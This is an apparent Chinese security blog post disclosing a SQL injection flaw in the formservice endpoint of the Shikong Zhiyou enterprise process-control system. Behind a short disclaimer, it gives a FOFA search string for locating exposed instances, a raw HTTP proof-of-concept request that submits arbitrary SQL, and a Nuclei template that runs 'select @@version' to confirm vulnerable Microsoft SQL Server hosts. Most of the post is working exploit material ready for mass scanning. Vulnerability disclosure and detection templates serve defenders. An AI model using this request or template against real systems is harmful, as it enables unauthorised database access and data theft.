#  时空智友企业流程化管控系统 formservice SQL注入漏洞   
原创 lcyunkong  云途安全   2024-04-21 18:44  
  
**0x00 阅读须知**  
  
****  
**免责声明：****本文提供的信息和方法仅供网络安全专业人员用于教学和研究目的，不得用于任何非法活动。读者若使用文章内容从事任何未授权的行为，需自行承担所有法律责任和后果。本公众号及作者对由此引起的任何直接或间接损失不负责任。请严格遵守相关法律法规。**  
###   
### 0x01 漏洞简介  
  
  
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统formservice存在SQL注入漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSaPOwSu7libKK8SGMGJboWtlxa81ev08iaj0Jp7GzFNt1SSJjUibLia8ja2FK5WUAZF6LNG8649ic2FDUQ/640?wx_fmt=png&from=appmsg "")  
###   
### 0x02 漏洞详情  
  
****  
**fofa：****body="企业流程化管控系统" || app="时空智友V10.1"**  
  
****  
**Poc：**  
```
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 50

{"params":{"a":"11"},"sql":"select 123456"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSaPOwSu7libKK8SGMGJboWtlFIaGnj3B6L8cicS4KJM9ib54ziclrSte0Aib2P3YNhV3ao3wySgTGExWSw/640?wx_fmt=png&from=appmsg "")  
  
**0x03 Nuclie**  
  
```
id: shikongzhiyou-formservice-sqli

info:
  name: shikongzhiyou-formservice-sqli
  author: unknow
  severity: high
  description: 时空智友企业流程化管控系统 formservice SQL注入漏洞
  tags: shikongzhiyou,sqli
  metadata:
    fofa-qeury: body="企业流程化管控系统" || app="时空智友V10.1"

http:
  - raw:
      - |              
        POST /formservice?service=workflow.sqlResult HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Content-Type: application/json
        Accept-Encoding: gzip
        Content-Length: 50
        
        {"params":{"a":"11"},"sql":"select @@version"}

    matchers:     
      - type: dsl
        name: sqli
        dsl:
          - (status_code==200 )  && contains(body, "Microsoft SQL Server")

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSaPOwSu7libKK8SGMGJboWtlwPTFEia2RTJcC1Tm22SmvHbKcd5J9UOsFnopokLXRlvdAznjEBIPwkQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
